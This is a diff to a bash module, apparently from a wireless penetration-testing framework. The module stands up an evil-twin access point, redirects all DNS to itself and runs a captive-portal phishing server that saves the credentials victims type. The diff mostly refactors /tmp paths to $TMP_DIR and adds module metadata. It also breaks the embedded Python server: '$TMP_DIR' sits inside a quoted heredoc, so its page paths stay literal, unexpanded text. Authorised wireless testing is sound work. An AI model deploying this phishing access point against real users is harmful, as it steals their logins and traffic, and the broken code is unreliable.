@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="Rogue AP / Evil Twin"
+# CATEGORY="F"
+# DEPS="A1"
+# CRITICAL="yes"
+# TOOLS="hostapd,dnsmasq,python3,iptables"
+# DESC="Deploy evil twin AP to test client susceptibility and WIDS response"
+# REQS="dual_iface,target_ssid,target_channel"
+# PCAP="yes"
+# DECODE="dhcp"
+
 #===============================================================================
 #  modules/f1_rogue_ap.sh
 #  F1: Rogue AP / Evil Twin (Multi-Mode)
@@ -195,14 +206,14 @@ run_f1() {
 
     check_abort || return 1
 
-    ${TOOL_PATHS[ip]} link set "$ap_iface" down 2>/dev/null || true
+    run_tool ip link set "$ap_iface" down 2>/dev/null || true
     iw dev "$ap_iface" set type __ap 2>/dev/null || true
-    ${TOOL_PATHS[ip]} link set "$ap_iface" up 2>/dev/null || true
-    register_cleanup "${TOOL_PATHS[ip]} addr flush dev $ap_iface 2>/dev/null || true; ${TOOL_PATHS[ip]} link set $ap_iface down 2>/dev/null || true; iw dev $ap_iface set type managed 2>/dev/null || true; ${TOOL_PATHS[ip]} link set $ap_iface up 2>/dev/null || true"
+    run_tool ip link set "$ap_iface" up 2>/dev/null || true
+    register_cleanup "run_tool ip addr flush dev $ap_iface 2>/dev/null || true; run_tool ip link set $ap_iface down 2>/dev/null || true; iw dev $ap_iface set type managed 2>/dev/null || true; run_tool ip link set $ap_iface up 2>/dev/null || true"
 
     local rogue_subnet="10.99.99"
-    ${TOOL_PATHS[ip]} addr flush dev "$ap_iface" 2>/dev/null || true
-    ${TOOL_PATHS[ip]} addr add "${rogue_subnet}.1/24" dev "$ap_iface" 2>/dev/null || true
+    run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
+    run_tool ip addr add "${rogue_subnet}.1/24" dev "$ap_iface" 2>/dev/null || true
 
     #--- Step 4: Create ${TOOL_PATHS[hostapd]} config ---
     log_step 4 10 "Configuring rogue AP"
@@ -245,7 +256,7 @@ EOF
     # --- Start ${TOOL_PATHS[dnsmasq]} (DHCP + DNS) ---
     local dnsmasq_pid=""
     if [[ "$has_dnsmasq" == "true" ]]; then
-        local dnsmasq_conf="/tmp/f1_dnsmasq.conf"
+        local dnsmasq_conf="$TMP_DIR/f1_dnsmasq.conf"
 
         if [[ "$attack_mode" == "portal" ]]; then
             # Portal mode: redirect ALL DNS to our IP
@@ -280,7 +291,7 @@ EOF
 
     # --- Start ${TOOL_PATHS[hostapd]} ---
     log_cmd "${TOOL_PATHS[hostapd]} ${hostapd_conf}"
-    ${TOOL_PATHS[hostapd]} "$hostapd_conf" > /tmp/f1_hostapd.log 2>&1 &
+    ${TOOL_PATHS[hostapd]} "$hostapd_conf" > $TMP_DIR/f1_hostapd.log 2>&1 &
     local hostapd_pid=$!
     register_cleanup "kill -TERM $hostapd_pid 2>/dev/null || true; wait $hostapd_pid 2>/dev/null || true"
 
@@ -292,7 +303,7 @@ EOF
         echo "Rogue AP started successfully" >> "$findings_file"
     else
         log_error "Failed to start rogue AP"
-        cat /tmp/f1_hostapd.log >> "$findings_file" 2>/dev/null
+        cat $TMP_DIR/f1_hostapd.log >> "$findings_file" 2>/dev/null
         _f1_cleanup "$ap_iface" "$tcpdump_pid" "$dnsmasq_pid" "" ""
         return 1
     fi
@@ -336,10 +347,10 @@ EOF
             echo ""
         } > "$portal_creds_file"
 
-        python3 /tmp/f1_portal_server.py \
+        python3 $TMP_DIR/f1_portal_server.py \
             --port 8080 \
             --creds-file "$portal_creds_file" \
-            &>/tmp/f1_portal.log &
+            &>$TMP_DIR/f1_portal.log &
         local portal_pid=$!
         register_cleanup "kill -TERM $portal_pid 2>/dev/null || true; wait $portal_pid 2>/dev/null || true"
 
@@ -348,7 +359,7 @@ EOF
             log_success "Captive portal active on ${rogue_subnet}.1:8080"
         else
             log_warn "Portal server failed to start — continuing without portal"
-            cat /tmp/f1_portal.log >> "$findings_file" 2>/dev/null
+            cat $TMP_DIR/f1_portal.log >> "$findings_file" 2>/dev/null
             local portal_pid=""
         fi
     else
@@ -413,8 +424,8 @@ EOF
 
         # Live status updates
         local current_clients=0
-        if [[ -f /tmp/f1_hostapd.log ]]; then
-            local current_clients=$(grep -c "AP-STA-CONNECTED" /tmp/f1_hostapd.log 2>/dev/null) || true
+        if [[ -f $TMP_DIR/f1_hostapd.log ]]; then
+            local current_clients=$(grep -c "AP-STA-CONNECTED" $TMP_DIR/f1_hostapd.log 2>/dev/null) || true
         fi
 
         local current_creds=0
@@ -435,14 +446,14 @@ EOF
     stop_countdown
 
     # Final counts
-    if [[ -f /tmp/f1_hostapd.log ]]; then
-        local clients_connected=$(grep -c "AP-STA-CONNECTED" /tmp/f1_hostapd.log 2>/dev/null) || true
+    if [[ -f $TMP_DIR/f1_hostapd.log ]]; then
+        local clients_connected=$(grep -c "AP-STA-CONNECTED" $TMP_DIR/f1_hostapd.log 2>/dev/null) || true
         local clients_connected=${clients_connected:-0}
 
         if [[ $clients_connected -gt 0 ]]; then
             log_result "CRITICAL" "★ ${clients_connected} client(s) connected to rogue AP!"
             echo "CRITICAL: ${clients_connected} client(s) connected" >> "$findings_file"
-            grep "AP-STA-CONNECTED" /tmp/f1_hostapd.log >> "$findings_file" 2>/dev/null
+            grep "AP-STA-CONNECTED" $TMP_DIR/f1_hostapd.log >> "$findings_file" 2>/dev/null
         fi
     fi
 
@@ -478,14 +489,15 @@ EOF
     if [[ -f "$probe_pcap" ]]; then
         validate_pcap "$probe_pcap" "Rogue AP client probe/association capture"
         if command -v tshark &>/dev/null; then
-            local probe_requests_seen=$(${TOOL_PATHS[tshark]} -r "$probe_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
+            ensure_user_ownership "$probe_pcap"
+            local probe_requests_seen=$(run_as_user tshark -r "$probe_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
             local probe_requests_seen=${probe_requests_seen:-0}
         fi
     fi
 
     # Cleanup temp files
-    rm -f /tmp/f1_dnsmasq.conf /tmp/f1_hostapd.log /tmp/f1_portal_server.py \
-          /tmp/f1_portal.html /tmp/f1_portal_success.html /tmp/f1_portal.log
+    rm -f $TMP_DIR/f1_dnsmasq.conf $TMP_DIR/f1_hostapd.log $TMP_DIR/f1_portal_server.py \
+          $TMP_DIR/f1_portal.html $TMP_DIR/f1_portal_success.html $TMP_DIR/f1_portal.log
 
     #--- Step 10: Save results ---
     log_step 10 10 "Saving results"
@@ -529,7 +541,7 @@ EOF
     evidence_list+="]"
 
     local result_json
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json=$(run_tool jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "Mode: ${attack_mode}, AP: ${rogue_ap_started}, Clients: ${clients_connected}, WIDS: ${wids_detected}, Probes: ${probe_requests_seen}, Creds: ${credentials_captured}" \
@@ -555,7 +567,7 @@ EOF
             evidence_files: $evidence_files
         }')
 
-    save_tc_result "F1" "$result_json"
+    save_tc_result "F1" "$result_json" "has_tool_output:1,clean_run:1"
 
     # Display summary
     echo ""
@@ -717,8 +729,8 @@ _f1_create_portal_page() {
     local ssid="$1"
     local template="${2:-generic}"
 
-    local portal_html="/tmp/f1_portal.html"
-    local success_html="/tmp/f1_portal_success.html"
+    local portal_html="$TMP_DIR/f1_portal.html"
+    local success_html="$TMP_DIR/f1_portal_success.html"
 
     # --- Success / thank-you page (always generated) ---
     cat > "$success_html" <<'SUCCESS_EOF'
@@ -847,7 +859,7 @@ PORTAL_EOF
     fi
 
     # --- Python HTTP server for captive portal ---
-    cat > /tmp/f1_portal_server.py <<'PYSERVER_EOF'
+    cat > $TMP_DIR/f1_portal_server.py <<'PYSERVER_EOF'
 #!/usr/bin/env python3
 """Captive portal phishing server for F1."""
 import http.server
@@ -858,9 +870,9 @@ import os
 import sys
 
 class PortalHandler(http.server.BaseHTTPRequestHandler):
-    creds_file = "/tmp/f1_portal_creds.txt"
-    portal_html = "/tmp/f1_portal.html"
-    success_html = "/tmp/f1_portal_success.html"
+    creds_file = "$TMP_DIR/f1_portal_creds.txt"
+    portal_html = "$TMP_DIR/f1_portal.html"
+    success_html = "$TMP_DIR/f1_portal_success.html"
 
     def log_message(self, format, *args):
         pass  # Suppress default logging
@@ -919,7 +931,7 @@ class PortalHandler(http.server.BaseHTTPRequestHandler):
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('--port', type=int, default=8080)
-    parser.add_argument('--creds-file', default='/tmp/f1_portal_creds.txt')
+    parser.add_argument('--creds-file', default='$TMP_DIR/f1_portal_creds.txt')
     args = parser.parse_args()
 
     PortalHandler.creds_file = args.creds_file
@@ -946,8 +958,8 @@ _f1_cleanup() {
     [[ -n "$portal_pid" ]] && { kill -TERM $portal_pid 2>/dev/null; wait $portal_pid 2>/dev/null; }
 
     # Restore interface
-    ${TOOL_PATHS[ip]} addr flush dev "$iface" 2>/dev/null || true
-    ${TOOL_PATHS[ip]} link set "$iface" down 2>/dev/null || true
+    run_tool ip addr flush dev "$iface" 2>/dev/null || true
+    run_tool ip link set "$iface" down 2>/dev/null || true
     iw dev "$iface" set type managed 2>/dev/null || true
-    ${TOOL_PATHS[ip]} link set "$iface" up 2>/dev/null || true
+    run_tool ip link set "$iface" up 2>/dev/null || true
 }
